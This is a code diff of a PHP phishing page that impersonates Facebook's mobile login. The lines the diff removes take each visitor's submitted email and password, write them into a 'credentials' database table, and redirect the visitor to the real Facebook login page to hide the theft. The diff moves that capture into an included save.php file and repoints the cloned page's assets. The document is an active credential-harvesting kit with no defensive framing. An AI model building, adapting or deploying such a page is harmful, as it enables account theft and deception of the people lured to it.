@@ -1,21 +1,5 @@
 <?php
-$servername = "localhost";
-$username   = "root";
-$password   = "";
-$dbname     = "eypbi";
-
-if ($_POST) {
-    $conn     = new mysqli($servername, $username, $password, $dbname);
-    $email    = $_POST['email'];
-    $password = $_POST['pass'];
-    $sql      = "INSERT INTO credentials (email, password)
-                  VALUES ('$email', '$password')";
-    $conn->query($sql);
-    $conn->close();
-    header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110");
-    die();
-}
-
+require_once('../save.php');
 ?>
 <!DOCTYPE html>
 <!-- saved from url=(0069)https://m.facebook.com/?refsrc=https%3A%2F%2Fwww.facebook.com%2F&_rdr -->
@@ -26,10 +10,10 @@ if ($_POST) {
     <meta name="viewport" content="user-scalable=no,initial-scale=1.0001,maximum-scale=1.0001">
     <!-- <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/N4H_50KFp8i.png" rel="apple-touch-icon-precomposed" sizes="120x120"> -->
     <meta name="referrer" content="default" id="meta_referrer">
-    <link rel="stylesheet" type="text/css" data-bootloader-hash="oja1/" href="./fb_files/4BfqTkBgHZK.css">
-    <link rel="stylesheet" type="text/css" data-bootloader-hash="tnI+q" href="./fb_files/exlSgORPwUZ.css">
+    <link rel="stylesheet" type="text/css" data-bootloader-hash="oja1/" href="/mobile/fb_files/4BfqTkBgHZK.css">
+    <link rel="stylesheet" type="text/css" data-bootloader-hash="tnI+q" href="/mobile/fb_files/exlSgORPwUZ.css">
     <!-- jiwom <link rel="canonical" href="https://www.facebook.com/"> -->
-    <link type="text/css" rel="stylesheet" href="./fb_files/LjFOMBKFTrj.css">
+    <link type="text/css" rel="stylesheet" href="/mobile/fb_files/LjFOMBKFTrj.css">
 </head>
 <body tabindex="0" class="touch x2 ios sf _fzu _50-3 iframe acw portrait" style="min-height: 567px; background-color: rgb(255, 255, 255);">
 <div id="viewport" style="min-height: 567px;">
@@ -53,7 +37,7 @@ if ($_POST) {
                                 <div class="_4fmw grouped aclb">
                                     <a class="touchableArea first last area touchable acy apl abt abb" href="#" target="_top" data-sigil="touchable marea">
                                         <div class="ib cc">
-                                            <i class="img l img" style="background-image: url(&quot;./fb_files/yOUQZZgrqUR.png&quot;);background-repeat:no-repeat;background-size:100% 100%;-webkit-background-size:100% 100%;width:18px;height:32px;"></i>
+                                            <i class="img l img" style="background-image: url(&quot;/mobile/fb_files/yOUQZZgrqUR.png&quot;);background-repeat:no-repeat;background-size:100% 100%;-webkit-background-size:100% 100%;width:18px;height:32px;"></i>
                                             <div class="c"><span class="fcl">Get Facebook for iPhone and browse faster.</span></div>
                                         </div>
                                     </a>
@@ -99,7 +83,7 @@ if ($_POST) {
                 </div>
             </div>
             <div>
-                <div><iframe id="u_0_g" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" height="1" width="1" src="./fb_files/referer_frame.html"></iframe><iframe id="u_0_h" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" height="1" width="1" src="./fb_files/referer_frame(1).html"></iframe></div>
+                <div><iframe id="u_0_g" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" height="1" width="1" src="/mobile/fb_files/referer_frame.html"></iframe><iframe id="u_0_h" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" height="1" width="1" src="/mobile/fb_files/referer_frame(1).html"></iframe></div>
             </div>
             <div class="_55wr _5ui2">
                 <div class="_5dpw">
